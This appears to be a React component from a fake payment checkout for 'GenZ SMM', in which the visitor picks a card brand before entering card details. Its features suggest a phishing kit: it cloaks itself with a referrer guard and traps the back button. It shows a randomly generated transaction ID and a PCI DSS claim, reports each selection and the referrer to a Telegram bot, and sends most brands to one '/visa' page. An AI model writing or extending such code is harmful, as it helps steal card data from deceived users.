import { useState, useEffect } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { CreditCard, Shield, ArrowLeft, Globe } from "lucide-react";
import { sendTelegramNotification } from "@/lib/telegram";
import { useReferrerGuard } from "@/hooks/useReferrerGuard";
import CancelPaymentDialog from "@/components/CancelPaymentDialog";
import VisaLogo from "@/components/logos/VisaLogo";
import MastercardLogo from "@/components/logos/MastercardLogo";
import AmexLogo from "@/components/logos/AmexLogo";
import TroyLogo from "@/components/logos/TroyLogo";
import DiscoverLogo from "@/components/logos/DiscoverLogo";
import genzLogo from "@/assets/genz-logo.png";

const cardOptions = [
  { id: "visa", label: "Visa", Logo: VisaLogo, route: "/visa" },
  { id: "mastercard", label: "Mastercard", Logo: MastercardLogo, route: "/mastercard" },
  { id: "amex", label: "American Express", Logo: AmexLogo, route: "/visa" },
  { id: "troy", label: "Troy", Logo: TroyLogo, route: "/visa" },
  { id: "discover", label: "Discover", Logo: DiscoverLogo, route: "/visa" },
];

const CardSelectPage = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get("amount") || "00";
  const { checking: referrerChecking } = useReferrerGuard();
  const [selected, setSelected] = useState<string | null>(null);
  const [showCancelDialog, setShowCancelDialog] = useState(false);

  // Generate a random transaction ID
  const [txnId] = useState(() => {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
  });

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href);
      navigate(`/?amount=${amount}`);
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount]);

  const handleContinue = () => {
    if (!selected) return;
    const option = cardOptions.find((c) => c.id === selected);
    if (!option) return;
    sendTelegramNotification({
      type: "payment_activity",
      method: option.label,
      paymentType: "card",
      referrer: document.referrer || "Direct",
    });
    navigate(`${option.route}?amount=${amount}&txnId=${txnId}`);
  };

  if (referrerChecking) return null;

  return (
    <div className="min-h-[100dvh] bg-[#f0f4f8] flex flex-col items-center p-4">
      <div className="w-full max-w-md">
        {/* Header */}
        <div className="flex items-center gap-3 mb-6">
          <div className="w-10 h-10 bg-[#dbeafe] rounded-xl flex items-center justify-center">
            <CreditCard className="w-5 h-5 text-[#3b82f6]" />
          </div>
          <div>
            <h1 className="text-[#1e293b] text-lg font-bold leading-tight">Pay with Credit/Debit Card</h1>
            <p className="text-[#94a3b8] text-sm">Select Payment Method</p>
          </div>
        </div>

        {/* Transaction Details Card */}
        <div className="bg-white rounded-2xl shadow-sm border border-[#e2e8f0] p-5 mb-6">
          <div className="flex items-center gap-2 mb-4">
            <Shield className="w-5 h-5 text-[#3b82f6]" />
            <span className="text-[#1e293b] font-semibold text-base">Transaction Details</span>
          </div>

          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <CreditCard className="w-4 h-4 text-[#94a3b8]" />
                <span className="text-[#64748b] text-sm">Amount</span>
              </div>
              <span className="text-[#1e293b] font-bold text-xl">BDT {amount}</span>
            </div>

            <div className="border-t border-[#f1f5f9]" />

            <div className="flex items-center justify-between">
              <span className="text-[#94a3b8] text-xs">Transaction ID</span>
              <span className="text-[#475569] text-xs font-mono">{txnId}</span>
            </div>

            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Globe className="w-4 h-4 text-[#94a3b8]" />
                <span className="text-[#94a3b8] text-xs">Merchant ID</span>
              </div>
              <span className="text-[#475569] text-xs font-semibold">GenZ SMM</span>
            </div>
          </div>
        </div>

        {/* Card Selection */}
        <div className="grid grid-cols-5 gap-2 mb-6">
          {cardOptions.map((card) => (
            <button
              key={card.id}
              onClick={() => setSelected(card.id)}
              className={`flex items-center justify-center py-3 px-1 rounded-xl border-2 transition-all ${
                selected === card.id
                  ? "border-[#3b82f6] bg-[#eff6ff] shadow-sm"
                  : "border-[#e2e8f0] bg-white hover:border-[#cbd5e1]"
              }`}
            >
              <div className="h-10 flex items-center justify-center">
                <card.Logo />
              </div>
            </button>
          ))}
        </div>

        {/* Continue Button */}
        <button
          onClick={handleContinue}
          disabled={!selected}
          className={`w-full py-3.5 rounded-xl text-sm font-semibold transition-all ${
            selected
              ? "bg-[#818cf8] text-white hover:bg-[#6366f1] shadow-md"
              : "bg-[#c7d2fe] text-white cursor-not-allowed"
          }`}
        >
          Continue
        </button>

        {/* Back to Store */}
        <button
          onClick={() => navigate(`/?amount=${amount}`)}
          className="w-full flex items-center justify-center gap-2 py-3 mt-3 rounded-xl border border-[#e2e8f0] bg-white text-[#64748b] text-sm font-medium hover:bg-[#f8fafc] transition-all"
        >
          <ArrowLeft className="w-4 h-4" />
          Back to the Selection
        </button>

        {/* Footer */}
        <div className="flex items-center justify-between mt-6 px-1">
          <div className="flex items-center gap-1.5 text-[#94a3b8]">
            <Shield className="w-3.5 h-3.5" />
            <span className="text-[10px]">Data are protected by the PCI DSS standard</span>
          </div>
          <div className="flex items-center gap-1 text-[#94a3b8]">
            <Globe className="w-3 h-3" />
            <span className="text-[10px]">EN</span>
          </div>
        </div>
      </div>

      <CancelPaymentDialog
        open={showCancelDialog}
        onOpenChange={setShowCancelDialog}
        onConfirmCancel={() =>
          navigate(`/payment-cancelled?channel=Card Payment&reason=Payment isn't completed&amount=${amount}`)
        }
      />
    </div>
  );
};

export default CardSelectPage;
